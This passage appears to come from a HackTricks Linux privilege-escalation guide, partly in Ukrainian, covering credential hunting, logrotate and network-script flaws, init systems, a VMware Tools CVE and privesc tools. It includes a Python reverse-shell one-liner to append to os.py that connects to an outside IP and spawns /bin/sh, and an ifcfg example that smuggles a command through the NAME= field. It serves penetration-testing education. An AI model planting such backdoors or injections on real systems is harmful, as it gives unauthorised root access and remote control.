grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Щоб **читати логи**, група [**adm**](interesting-groups-linux-pe/index.html#adm-group) буде дуже корисною.

### Shell файли
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Загальний пошук Creds/Regex

Вам також слід перевірити файли, що містять слово "**password**" у своїй **назві** або у **вмісті**, а також перевіряти IPs та emails у логах, або hashes regexps.\
Я не збираюся тут перелічувати, як це все робити, але якщо вам цікаво, ви можете перевірити останні перевірки, які виконує [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Файли, доступні для запису

### Python library hijacking

Якщо ви знаєте **where** буде виконуватися python скрипт і ви **can write inside** ту папку або ви можете **modify python libraries**, ви можете змінити OS library і backdoor її (якщо ви можете записувати там, де виконується python скрипт, скопіюйте та вставте бібліотеку os.py).

Щоб **backdoor the library**, просто додайте в кінець бібліотеки os.py наступний рядок (змініть IP і PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Експлуатація logrotate

Уразливість у `logrotate` дозволяє користувачам з **правами запису** у файл журналу або в його батьківські каталоги потенційно отримати підвищені привілеї. Це тому, що `logrotate`, який часто працює як **root**, можна змусити виконувати довільні файли, особливо в каталогах типу _**/etc/bash_completion.d/**_. Важливо перевіряти права не лише в _/var/log_, а й у будь-якому каталозі, де застосовується ротація логів.

> [!TIP]
> Ця вразливість впливає на `logrotate` версії `3.18.0` і старіші

Більш детальну інформацію про вразливість можна знайти на цій сторінці: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Ви можете експлуатувати цю вразливість за допомогою [**logrotten**](https://github.com/whotwagner/logrotten).

Ця вразливість дуже схожа на [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** тому коли ви знаходите, що можете змінювати логи, перевірте, хто їх керує, і чи можна ескалювати привілеї, підставивши логи через symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Посилання на вразливість:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Якщо з якоїсь причини користувач може **записати** `ifcf-<whatever>` скрипт у _/etc/sysconfig/network-scripts_ **або** може **змінити** існуючий — то ваша **system is pwned**.

Мережеві скрипти, наприклад _ifcg-eth0_, використовуються для мережевих підключень. Вони виглядають точно як .INI файли. Однак вони \~sourced\~ у Linux Network Manager (dispatcher.d).

У моєму випадку атрибут `NAME=` у цих мережевих скриптах обробляється некоректно. Якщо у назві є **пробіл**, система намагається виконати частину після пробілу. Це означає, що **все після першого пробілу виконується як root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Зверніть увагу на пробіл між Network та /bin/id_)

### **init, init.d, systemd та rc.d**

Каталог `/etc/init.d` містить **скрипти** для System V init (SysVinit), **класичної системи управління сервісами Linux**. Він включає скрипти для `start`, `stop`, `restart` і інколи `reload` сервісів. Ці скрипти можна виконувати напряму або через символічні посилання у `/etc/rc?.d/`. Альтернативний шлях у Redhat-системах — `/etc/rc.d/init.d`.

З іншого боку, `/etc/init` пов'язаний з **Upstart**, новішою системою **управління сервісами**, впровадженою Ubuntu, що використовує конфігураційні файли для керування сервісами. Незважаючи на перехід до Upstart, скрипти SysVinit досі використовуються разом з конфігураціями Upstart через суміснісний шар в Upstart.

**systemd** є сучасним ініціалізатором та менеджером сервісів, що пропонує розширені можливості, такі як відкладене запускання демонів, керування automount та знімки стану системи. Він організовує файли у `/usr/lib/systemd/` для пакетів дистрибутива та у `/etc/systemd/system/` для змін адміністратора, спрощуючи адміністрування системи.

## Інші трюки

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks зазвичай hook-ають syscall, щоб відкрити привілейовану функціональність ядра для userspace-менеджера. Слабка аутентифікація менеджера (наприклад, перевірки підписів на базі FD-order або слабкі схеми паролів) може дозволити локальному додатку видавати себе за менеджера та escalate до root на вже rooted-пристроях. Дізнайтеся більше та деталі експлуатації тут:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery у VMware Tools/Aria Operations може витягувати шлях до бінарного файлу з командних рядків процесів і виконувати його з параметром -v у привілейованому контексті. Дозволяючі шаблони (наприклад, використання \S) можуть співпасти з розміщеними атакуючим слушачами у записуваних локаціях (наприклад, /tmp/httpd), що призводить до виконання як root (CWE-426 Untrusted Search Path).

Дізнайтеся більше та перегляньте узагальнений шаблон, застосовний до інших discovery/monitoring стеків тут:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Захист ядра

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Додаткова допомога

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
